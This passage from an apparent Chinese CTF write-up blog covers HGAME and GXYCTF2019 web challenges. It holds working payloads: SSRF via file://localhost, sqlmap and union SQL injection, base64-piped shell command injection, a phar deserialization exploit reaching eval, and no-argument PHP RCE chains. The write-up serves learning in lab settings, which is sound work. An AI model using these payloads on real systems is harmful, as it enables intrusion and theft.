punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"用户名或密码错误"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>同样的方法读取其他源码</p><p>读取admin.php</p><pre class=" language-PHP"><code class="language-PHP"><?phpinclude "config.php";session_start();if(!isset($_SESSION['username'])) {    header('Location: index.php');    exit();}function insert_img() { // 定义一个插入图片的函数    if (isset($_POST['img_url'])) {        $img_url = @$_POST['img_url'];        $url_array = parse_url($img_url);        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") { // 感觉要SSRF?但是如何绕过这里?            return false;        }           $c = curl_init(); // SSRF石锤        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents("static/logo.png")); // 返回URL错误的图片    }}?></code></pre><p>index.php</p><pre class=" language-PHP"><code class="language-PHP"><?phperror_reporting(0);session_start();if(isset($_SESSION['username'])) { //设置名为username的session    header("Location: admin.php"); //index.php并没有与sql交互,因此排除sql注入    exit();}$action = @$_GET['action'];$filter = "/config|etc|flag/i";if (isset($_GET['action']) && !empty($_GET['action'])) {    if(preg_match($filter, $_GET['action'])) { // 过滤掉action中的config etc flag         echo "Hacker get out!";        exit(); // 退出脚本    }        include $action;}elseif(!isset($_GET['action']) || empty($_GET['action'])) {    header("Location: ?action=login.php");    exit();}</code></pre><p>通过三个代码审计,问题存在于admin.php</p><p>得到我的session为<code>lvp1pri3iamh9fhl35sanlga0o</code></p><p>首先要知道session的文件名 <code>sess_+sessionid ,  sessionid可以通过开发者模式获取</code></p><p>所以,这里我的session文件名为<code>sess_lvp1pri3iamh9fhl35sanlga0o</code>,尝试了一波利用后,无果</p><p>我们再来看到login.php中的这段代码</p><pre class=" language-PHP"><code class="language-PHP">//Only for debugif (DEBUG_MODE){    if(isset($_GET['debug'])) {        $debug = $_GET['debug'];        if (!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $debug)) {            die("args error!");        }        eval("var_dump($$debug);"); //这里eval中利用的是$$可变变量</code></pre><p>我们可以利用<code>?debug=GLOBALS,再利用var_dump</code>输出相关信息,果然是这样的</p><p><img src="https://i.loli.net/2020/01/25/ePyUJOZAq8fgEYD.png" alt></p><p>得到<code>[&quot;admin_password&quot;]=&gt;    string(32) &quot;0e114902927253523756713132279690&quot;    [&quot;admin_username&quot;]=&gt;    string(7) &quot;Cosmos!&quot;</code></p><p>即<code>Cosmos</code>为用户名,密码应该是<code>md5</code>了的,解一下,发现解不开,但是在学<code>md5碰撞</code>的时候,我们知道,以<code>0e</code>开头的PHP当做科学计数法,都为<code>0</code>,试着去登录一下,发现登录不上去</p><p>我们再来看这一段代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$admin_password</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$admin_username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: admin.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>现在我们知道了用户名为Cosmos,如果<code>md5($_POST[&#39;password&#39;]==$admin_password</code> 那么就可以成功登录</p><p><strong>php是天下最好的语言!因此我们只需要传递一个密码,让他md5后也是0e开头的就可以了!</strong></p><p><code>==</code>比较,会<strong>先将字符串类型转换成相同的,然后再比较.</strong>XD,之前登录不上去,原来是因为用户名还有一个<code>!</code>,坑人啊</p><p>那么构造用户名为<code>Cosmos!</code>密码<code>QNKCDZO</code> 成功登录后台,长着个样子,<strong>只有一个插入图片的功能</strong>之前也分析了,后台好像存在SSRF</p><p><img src="https://i.loli.net/2020/01/25/6NboeDP9CzOHSTI.png" alt></p><p>定位到相关的代码</p><pre class=" language-PHP"><code class="language-PHP">function insert_img() {    if (isset($_POST['img_url'])) {        $img_url = @$_POST['img_url'];        $url_array = parse_url($img_url); //解析 URL，返回其组成部分        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") {            return false;        }           $c = curl_init();  // 执行curl会话,这里经常会出现ssrf        curl_setopt($c, CURLOPT_URL, $img_url);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        $res = curl_exec($c);        curl_close($c);        $avatar = base64_encode($res);        if(filter_var($img_url, FILTER_VALIDATE_URL)) {            return $avatar;        }    }    else {        return base64_encode(file_get_contents("static/logo.png"));    }}</code></pre><p>其中最主要的代码,<strong>flag在根目录下面</strong>,这里应该就是 <code>&amp;&amp;</code>是与,即前后两个表达式必须为真,如果第一个表达式为假就不进行第二个表达式运算 ,<code>!==</code>表示不完全等于,现在就是利用SSRF去读取根目录下面的flag</p><p><img src="https://i.loli.net/2020/01/25/JOpw6k8L9ZyBPEg.png" alt="parse_url"></p><p>现在难点就是如何绕过这个</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$url_array</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"localhost"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$url_array</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"timgsa.baidu.com"</span><span class="token punctuation">)</span></code></pre><p>绕过<code>parse_url()</code></p><p><img src="https://i.loli.net/2020/01/25/7YzGymCHtWBnJAw.png" alt></p><p>即host必须是<code>localhost</code>和<code>timagsa.baidu.com</code> 否则返回false, 是的话就发起curl会话</p><p>因为flag在根目录下,所以乱打了一个payload,出来了,但是我感觉这和<strong>代码中判断满足两个host完全不上号</strong></p><p>所以应该是利用了PHP代码的灵活性<code>PHP中 &amp;&amp; 逻辑与运算是只算第一个表达式,如果第一个为false,直接返回false而且直接不计算第二个表达式,所以第二个表达式直接就没用了,因此只需要host为localhost就行了</code></p><blockquote><p>1、./是当前目录</p><p>2、../是父级目录</p><p>3、/是根目录</p></blockquote><p>payload</p><blockquote><pre><code>file://localhost/./..//flag</code></pre></blockquote><p><img src="https://i.loli.net/2020/01/25/1lQa274VHLxRg6T.png" alt></p><p><img src="https://i.loli.net/2020/01/25/PB4XaQO8rjSdClg.png" alt></p><p>参考资料</p><p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass" target="_blank" rel="noopener">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass</a></p><p><a href="http://www.bubuko.com/infodetail-2839004.html" target="_blank" rel="noopener">http://www.bubuko.com/infodetail-2839004.html</a></p><p><strong>*”不要禁锢自己的思维,代码也很灵活,人就要比代码更灵活”*</strong></p><h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>知识点:</p><p>SQLi</p><p>直接使用sqlmap就可以做出来了,前期工作是对<code>/?id=</code>进行爆破,发现并不是.然后因为<code>题目会将我们输入的内容回显在页面上</code>这一点,我还想过<code>XSS</code>,发现确实能弹窗,哈哈哈,但是对这道题应该是没有什么用的.</p><p><img src="https://i.loli.net/2020/01/23/HbxlRCSPKdLgY8k.png" alt></p><p>因此应该是sql注入了,把</p><p>后端代码类似是</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">"$id"</span><span class="token punctuation">;</span></code></pre><p>抓包后,将请求的内容保存下来</p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt --dbs --tamper=space2comment</code>得到数据库为<code>easysql</code></p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt -D easysql --tables --tamper=space2comment</code>得到表为<code>f1aggggggggggggg</code></p><p><code>root@ifonlys-kali:~# sqlmap -r 1.txt -D easysql -T f1aggggggggggggg --columns --tamper=space2comment</code>得到表中字段为<code>fl4444444g</code></p><p><img src="https://i.loli.net/2020/01/23/fSn3hyO4q7bgxsD.png" alt></p><p>得到flag</p><pre><code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><p>其实这道题是过滤了<code>空格</code>的sql注入,用<code>/***/</code>绕过就行了</p><h1 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言#"></a>Cosmos的新语言#</h1><p>应该是要写脚本来抓取代码,但是<strong>难点是这个代码的顺序是随机的</strong>.所以我可以用python来抓取每次刷新的代码,但是这个组合情况我不清楚.所以暂时没有想到好的思路</p><h1 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室*"></a>Cosmos的聊天室*</h1><p>决定复现一下这道题</p><p>先是爆破验证码</p><p><code>md5.py</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#s = hashlib.sha1(str(i)).hexdigest()[:6]</span>    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">"e1656e"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>根据题目的<code>flag is here</code>中提示的要admin才能看到flag,应该是利用xxe获取到admin的token然后伪造身份拿到flag</p><p>但是由于上面的脚本对于题目刷新后.有些验证码爆破不出来了,真的有点恼火.这道题对<code>&lt;&gt;</code>做出了过滤,可以用实体编码绕过,但是输出的代码会被自动转换为大写</p><pre><code>&amp;lt;user role=&quot;admin&quot;&amp;gt;user1&amp;lt;/user&amp;gt;</code></pre><p>在看了大佬写的wp后,发现这道题是利用了<code>XSS+浏览器容错性</code></p><p>而且用了<code>Chrome</code>浏览器,我用<code>FireFox</code>试了下,也行,所以这两个浏览器应该都具备这种特性</p><p><img src="https://i.loli.net/2020/02/04/gDcvRhuCEdFeU8S.png" alt></p><p><img src="https://i.loli.net/2020/02/04/RNgs2VbF1Ck8PXI.png" alt></p><p>参考wp: </p><p><a href="https://0727.site/2020/01/31/HGAME_week02_wp/#more" target="_blank" rel="noopener">https://0727.site/2020/01/31/HGAME_week02_wp/#more</a></p><p><a href="https://zhuanlan.zhihu.com/p/75619278" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75619278</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 刷题笔记</title>
      <link href="/posts/20200124/"/>
      <url>/posts/20200124/</url>
      
        <content type="html"><![CDATA[<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>命令执行</p><ul><li>bypass 空格 flag 特殊符号如{},and so on</li></ul><p>绕过以上可以用编码绕过和bash拼接形式的</p><p><a href="http://hack-for.fun/2020/01/17/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RCE%E6%BC%8F%E6%B4%9E/#2-%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF">http://hack-for.fun/2020/01/17/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RCE%E6%BC%8F%E6%B4%9E/#2-%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF</a></p><p>base64版本的payload</p><pre><code>/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</code></pre><p>bash版本</p><pre><code>/?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php</code></pre><h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><p>在注释中得到<code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code>进行一次base32解码后得到<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code>进行一次base64编码后得到</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span></code></pre><p>这里直接可以使用sqlmap做.通过sqlmap跑,发现得到了admin密码的md5值<code>cdc9c819c7f8be2628d4180669009d28</code> 看了WP知道,,,原来是<code>union的万能密码登录</code></p><blockquote><p>当联合查询一个不存在的数据时会虚拟一个根据使用表排序的数据,根据这个特性来进行绕过</p></blockquote><p>username</p><p><code>-1&#39; union select 1, &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39; #</code>  </p><p>password,随便</p><p>登录进去得到flag</p><blockquote><p>关键是为什么我跑出来的md5和wp的md5不一样???</p></blockquote><h1 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0***"></a>BabysqliV3.0***</h1><ul><li><p>弱口令</p></li><li><p>文件包含</p></li><li><p>phar反序列化导致rce <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></li><li><p>参考资料</p><p><a href="https://www.gem-love.com/websecurity/490.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/490.html</a></p><p><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/205943.html</a></p></li></ul><p>phar Php ARchive 是PHP里类似于JAR的一种打包文件.会对相应的的class进行序列化存储,在执行某些函数或者需要调用数据的时候<strong>自动反序列化</strong></p><p>注释中存在的<code>u9db8</code>,我第一次做的时候没有好好利用,一直认为是一个注入题,结果根本就不是一个注入点.XD</p><p>然后<code>u9db8</code>不敏感的原因也很简单,自己<strong>基础知识不够牢固没学扎实.</strong></p><p>进行Unicode转码后得到<code>鶸</code>,说明这不是sqli.是一个弱口令</p><p>admin/password登录进去后,是一个文件上传界面</p><p><code>home.php?file=upload</code>,忙猜存在文件包含,然后直接访问upload.php和之前那个是一样的,故存在</p><p>phar可影响的函数</p><p><img src="https://i.loli.net/2020/01/21/t9bAJEQiWd4VeIk.png" alt></p><p>当然最常用的还是<code>file_put_contents</code>和<code>file_get_contents</code></p><p>admin/password 即可成功登录,登录进去后是一个文件上传的页面</p><p>首先包含home.php(tips: 如果有时候xxx.php被过滤,试着用xxx)</p><pre><code>http://b6f0bbbf-8a8b-4ef7-bcb1-e728c86a1d30.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=home</code></pre><pre class=" language-PHP"><code class="language-PHP"><?phpsession_start();echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";error_reporting(0);if(isset($_SESSION['user'])){    if(isset($_GET['file'])){        if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){            die("hacker!");        }        else{            if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){                $file = $_GET['file'].".php";            }            else{                $file = $_GET['file'].".fxxkyou!";            }            echo "当前引用的是 ".$file;            require $file;        }    }    else{        die("no permission!");    }}?></code></pre><p>然后upload.php</p><pre class=" language-PHP"><code class="language-PHP"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <form action="" method="post" enctype="multipart/form-data">    上传文件    <input type="file" name="file" />    <input type="submit" name="submit" value="上传" /></form><?phperror_reporting(0);class Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";//md5+token        $ext = ".txt";        @mkdir($sandbox, 0777, true);        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){ // 匹配这几个伪协议,进行文件包含            $this->Filename = $_GET['name'];        }        else{            $this->Filename = $sandbox.$_SESSION['user'].$ext;        }        $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";        $this->token = $_SESSION['user'];    }    function upload($file){        global $sandbox; // 定义全局变量        global $ext;        if(preg_match("[^a-z0-9]", $this->Filename)){            $this->cmd = "die('illegal filename!');";        }        else{            if($file['size'] > 1024){ // 文件大小不能超过1024 超过就无法上传                $this->cmd = "die('you are too big (′▽`〃)');";            }            else{                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";// 将上传的文件进行路劲转移            }        }    }    function __toString(){ // 如果参数为数组则会调用__toString()        global $sandbox;        global $ext;        // return $sandbox.$this->Filename.$ext;        return $this->Filename; // 返回Filename的值    }    function __destruct(){        if($this->token != $_SESSION['user']){ // 执行反序列化的时候检查token            $this->cmd = "die('check token falied!');";        }        eval($this->cmd); // rce点    }}if(isset($_FILES['file'])) {    $uploader = new Uploader(); // 实例化类    $uploader->upload($_FILES["file"]);    if(@file_get_contents($uploader)){ // 将文件内容以字符串的形式输出        echo "下面是你上传的文件：<br>".$uploader."<br>";        echo file_get_contents($uploader);    }}?></code></pre><p>关于phar反序列化,这一点我也还没有深入学习写笔记.因此这里直接搬一点官方wp中的知识</p><p><img src="https://i.loli.net/2020/01/24/m8r6lengSzFa2tL.png" alt></p><p>设置pharreadonly=Off</p><blockquote><p>phar还有一个特点，无需特定的文件后缀，即使使用txt格式的后缀<strong>只要文件内容是phar的</strong></p><p><strong>格式即可被php识别为phar文件</strong>，可以利用这个feature上传txt文件构造反序列化。</p></blockquote><pre class=" language-php"><code class="language-php">@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub </span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string">"GXY320b7a4523609d3d70b40f7aecf5efd3"</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string">"echo file_get_contents('./flag.php');"</span><span class="token punctuation">;</span> <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> "phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//uploads/abef22fc29b1152e66fad2a1dd68770a/GXY320b7a4523609d3d70b40f7aecf5efd3.tx"; </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件 </span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://i.loli.net/2020/01/24/OM7aSuh8Wnv935c.png" alt></p><p>根据第一次随便上传的文件获取当前的路径和token,生成了exp.phar.然后<code>修改URL参数</code>上传任意文件得到flag</p><p><img src="https://i.loli.net/2020/01/24/ulR6SJZBLMvD4AN.png" alt></p><blockquote><p>非预期解</p></blockquote><p>看了师傅们的wp,发现师傅们真的牛逼.看来我对PHP代码的敏感性还是不够,必须多锻炼我们来看一下代码中的那段正则表达式</p><pre class=" language-PHP"><code class="language-PHP">if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name']))</code></pre><p>这段正则表达式,我之前简单分析的就是匹配<code>data://,filter://,php://和.</code>的,但是因为出题人为了代码的美观性,在管道符<code>|</code>旁边多加了空格,下面就注意了!!!!</p><blockquote><p>在正则匹配里面,空格就是<code>0x00</code>,这就导致前面匹配三个协议都失效了,只匹配了最后一个<code>.</code></p></blockquote><p>tips: </p><p>写正则表达式,不要随便乱打空格.读正则表达式,一定要仔细,不要一眼读个大概就走了</p><p>因此这里只需要<code>echo file_get_contents($uploader);</code> <code>$this-&gt;Filename = $_GET[&#39;name&#39;];</code></p><pre><code>upload.php/?name=flag.php</code></pre><h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃***"></a>禁止套娃***</h1><ul><li>Git源码泄露</li><li>无参数RCE/套娃命令执行</li></ul><p>扫描目录发现<code>/.git</code>,因此使用GitHack下载源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span></code></pre><p>有三个if判断,三个正则,要想得到flag,必须一个一个绕过套娃</p><p>第一个<code>data:\/\/|filter:\/\/|php:\/\/|phar:\/\/</code></p><p>匹配<code>data://,filter://,php://,phar://</code>这几个协议,使其不能通过文件文件包含来读取flag.php</p><p>第二个<code>[a-z,_]+\((?R)?\)</code>匹配a到z的字母和<code>_</code>以及这个<code>\((?R)?\)</code>,<code>(?R)</code>表示引用当前表达式的意思,多一个<code>?</code>表示可以有引用,也可以没有,匹配成功后用NULL替换,第二个正则的合法匹配是类似<code>a(b());</code>这种无参数命令套娃</p><p>则进行第三个匹配</p><p><code>/et|na|info|dec|bin|hex|oct|pi|log/i</code>这个匹配应该就是为了过滤一下相关的函数.</p><p>现在就是要如何构造一个无参数的payload并且让<code>eval()</code>这个函数来执行了读取flag.php</p><blockquote><p>无参数RCE的主要思路就是利用PHP动态函数的特性,在PHP5不行,在PHP7可以</p></blockquote><p>因为直接访问<code>flag.php</code>是不为空的(没有404),所以利用函数读取就行,思路难度在如何bypass</p><p>先使用<code>scandir()</code>函数查看当前目录情况,在使用<code>pos(localeconv())</code>构造<code>.</code>,再<code>print_r()</code>打印结果</p><pre><code>/?exp=print_r(scandir(pos(localeconv())));</code></pre><p><img src="https://i.loli.net/2020/01/23/ZmCL4dfVcWUTkEt.png" alt></p><p>得到flag.php在倒数第二个位置,我们知道<code>next()</code>函数可以读取数组中第二个元素,由于flag在倒数第二个,所以使用<code>array_reverse()</code>函数将数组反转,再使用next函数即可读取flag,再使用<code>show_source()</code>函数来显示PHP代码,拿到flag.也可以使用<code>highlight_file()</code>函数</p><p>最终的payload</p><pre><code>/?exp=print_r(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));</code></pre><p>或者</p><pre><code>/?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="https://i.loli.net/2020/01/23/sZm5ebilpwrY8fV.png" alt></p><p>寒假必须看看PHP手册了</p><pre class=" language-PHP"><code class="language-PHP"><?php  $a = scandir('.'); // "." 表示列出当前目录 "/" 列出根目录 "../"列出上一级目录  var_dump($a);?></code></pre><p>参考资料: </p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">php无参数命令执行</a></p><h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><p>随便上传了一个<code>eeee.png</code>上去,发现居然也会检测文件?fuzz了一下,会检测文件后缀名不能含有<code>ph</code></p><p><img src="https://i.loli.net/2020/01/23/zd9iQrgUjNGCEDh.png" alt></p><p>于是肯定就知道了会利用<code>Apache解析文件上传一个.htaccess</code>文件 <code>SetHandler 